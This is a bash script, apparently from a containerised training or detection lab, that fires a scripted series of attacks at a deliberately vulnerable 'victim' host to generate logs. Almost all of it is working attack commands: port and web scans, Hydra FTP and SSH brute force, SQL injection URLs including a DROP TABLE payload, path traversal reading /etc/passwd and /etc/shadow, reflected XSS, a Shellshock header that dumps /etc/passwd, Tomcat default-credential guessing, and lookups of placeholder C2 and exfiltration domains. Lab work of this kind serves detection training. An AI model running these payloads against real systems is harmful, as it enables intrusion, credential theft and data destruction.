#!/bin/bash
# attacks.sh — automated attack sequences against the lab victim
# Runs once and exits; re-run with: docker compose run --rm attacker
set -uo pipefail

TARGET="victim"
OUTPUT="/output/attacker"
LOG="${OUTPUT}/attacker.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG"
}

banner() {
    echo "" | tee -a "$LOG"
    echo "════════════════════════════════════════" | tee -a "$LOG"
    log ">>> $*"
    echo "════════════════════════════════════════" | tee -a "$LOG"
}

mkdir -p "$OUTPUT"

# ── 0. Wait for victim ────────────────────────────────────────────────────────
log "Waiting for victim at ${TARGET} (boot can take 30-60s)..."
TIMEOUT=120
ELAPSED=0
until ping -c1 -W1 "$TARGET" &>/dev/null; do
    sleep 2
    ELAPSED=$((ELAPSED + 2))
    if [ "$ELAPSED" -ge "$TIMEOUT" ]; then
        log "ERROR: Victim unreachable after ${TIMEOUT}s — aborting."
        exit 1
    fi
done
log "Victim is up. Waiting 15s for services to fully initialize..."
sleep 15

# ── 1. Targeted port scan ─────────────────────────────────────────────────────
banner "NMAP: Targeted service scan"
nmap -sV -sC --open \
    -p 21,22,23,25,80,139,445,3306,5432,5900,6667,8180 \
    -oN "${OUTPUT}/nmap_targeted.txt" \
    -oX "${OUTPUT}/nmap_targeted.xml" \
    "$TARGET" || true

# ── 2. Full port scan ─────────────────────────────────────────────────────────
banner "NMAP: Full port sweep"
nmap -sV -p- --min-rate 3000 \
    -oN "${OUTPUT}/nmap_full.txt" \
    "$TARGET" || true

# ── 3. Web scan port 80 ───────────────────────────────────────────────────────
banner "NIKTO: HTTP port 80"
nikto -h "http://${TARGET}" \
    -o "${OUTPUT}/nikto_80.txt" -Format txt \
    -maxtime 120s || true

# ── 4. Web scan port 8180 ─────────────────────────────────────────────────────
banner "NIKTO: Tomcat port 8180"
nikto -h "http://${TARGET}:8180" \
    -o "${OUTPUT}/nikto_8180.txt" -Format txt \
    -maxtime 60s || true

# ── 5. FTP brute force ────────────────────────────────────────────────────────
banner "HYDRA: FTP brute force (vsftpd 2.3.4)"
hydra -L /wordlists/users.txt \
      -P /wordlists/passwords.txt \
      -t 4 \
      -o "${OUTPUT}/hydra_ftp.txt" \
      ftp://"$TARGET" || true

# ── 6. SSH brute force ────────────────────────────────────────────────────────
banner "HYDRA: SSH brute force"
hydra -L /wordlists/users.txt \
      -P /wordlists/passwords.txt \
      -t 4 -s 22 \
      -o "${OUTPUT}/hydra_ssh.txt" \
      ssh://"$TARGET" || true

# ── 7. HTTP SQLi ──────────────────────────────────────────────────────────────
banner "CURL: SQLi"
log "SQLi: UNION-based"
curl -sv --max-time 10 \
    "http://${TARGET}/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2C2--&Submit=Submit" \
    -o /dev/null 2>>"$LOG" || true

log "SQLi: OR-based"
curl -sv --max-time 10 \
    "http://${TARGET}/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit" \
    -o /dev/null 2>>"$LOG" || true

log "SQLi: stacked"
curl -sv --max-time 10 \
    "http://${TARGET}/dvwa/vulnerabilities/sqli/?id=1%3BDROP+TABLE+users--&Submit=Submit" \
    -o /dev/null 2>>"$LOG" || true

# ── 8. Path traversal ────────────────────────────────────────────────────────
banner "CURL: Path traversal"
log "Traversal: /etc/passwd via LFI"
curl -sv --max-time 10 \
    "http://${TARGET}/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd" \
    -o /dev/null 2>>"$LOG" || true

log "Traversal: ../../etc/shadow"
curl -sv --max-time 10 \
    "http://${TARGET}/mutillidae/index.php?page=../../../../../../etc/shadow" \
    -o /dev/null 2>>"$LOG" || true

# ── 9. XSS ────────────────────────────────────────────────────────────────────
banner "CURL: XSS"
log "XSS: reflected script tag"
curl -sv --max-time 10 \
    "http://${TARGET}/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
    -o /dev/null 2>>"$LOG" || true

# ── 10. Shellshock ────────────────────────────────────────────────────────────
banner "CURL: Shellshock (CVE-2014-6271)"
log "Shellshock: User-Agent"
curl -sv --max-time 10 \
    -H "User-Agent: () { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
    "http://${TARGET}/cgi-bin/test.cgi" \
    -o /dev/null 2>>"$LOG" || true

# ── 11. Suspicious UAs ────────────────────────────────────────────────────────
banner "CURL: Suspicious User-Agent strings"
for ua in \
    "sqlmap/1.7 (https://sqlmap.org)" \
    "Nikto/2.1.6" \
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)" \
    "python-requests/2.28.0"; do
    curl -sv --max-time 5 -H "User-Agent: $ua" \
        "http://${TARGET}/" -o /dev/null 2>>"$LOG" || true
done

# ── 12. Anonymous FTP ─────────────────────────────────────────────────────────
banner "FTP: Anonymous login attempt"
curl -sv --max-time 10 \
    ftp://"$TARGET"/ --user anonymous:anonymous -l \
    2>>"$LOG" || true

# ── 13. DNS lookups (populate Zeek dns.log) ───────────────────────────────────
banner "DNS: Lookups to generate dns.log entries"
for domain in \
    google.com \
    github.com \
    example.com \
    "c2.attacker-beacon.evil" \
    "exfil.not-a-real-domain.xyz" \
    "metasploitable.local"; do
    log "DNS lookup: $domain"
    nslookup "$domain" 8.8.8.8 2>/dev/null || true
    sleep 0.5
done

# ── 14. Service banner grabs ──────────────────────────────────────────────────
banner "NETCAT: Banner grabs"
log "Telnet (23)"
echo "" | nc -w 3 "$TARGET" 23 2>/dev/null || true
log "SMTP (25)"
echo "EHLO attacker.local" | nc -w 3 "$TARGET" 25 2>/dev/null || true
log "IRC (6667) — UnrealIRCd backdoor probe"
echo "" | nc -w 3 "$TARGET" 6667 2>/dev/null || true

# ── 15. VNC/IRC probe ─────────────────────────────────────────────────────────
banner "NMAP: VNC and service deep-dive"
nmap -sV -p 5900,6667 --script=vnc-info,irc-info "$TARGET" \
    -oN "${OUTPUT}/nmap_extra.txt" || true

# ── 16. Tomcat auth ───────────────────────────────────────────────────────────
banner "CURL: HTTP auth brute (Tomcat manager)"
for cred in "tomcat:tomcat" "admin:admin" "tomcat:s3cret" "admin:password"; do
    user="${cred%%:*}"
    pass="${cred##*:}"
    log "Trying Tomcat manager: ${user}:${pass}"
    curl -sv --max-time 5 \
        -u "${user}:${pass}" \
        "http://${TARGET}:8180/manager/html" \
        -o /dev/null 2>>"$LOG" || true
done

# ── Done ──────────────────────────────────────────────────────────────────────
echo "" | tee -a "$LOG"
log "All attack sequences complete. Results written to ${OUTPUT}/"
log "  nmap_targeted.{txt,xml}  — service fingerprints"
log "  nmap_full.txt            — full port scan"
log "  nmap_extra.txt           — VNC/IRC probes"
log "  nikto_80.txt             — web vulns port 80"
log "  nikto_8180.txt           — web vulns port 8180 (Tomcat)"
log "  hydra_ftp.txt            — FTP brute-force results"
log "  hydra_ssh.txt            — SSH brute-force results"
log "  attacker.log             — this run log"
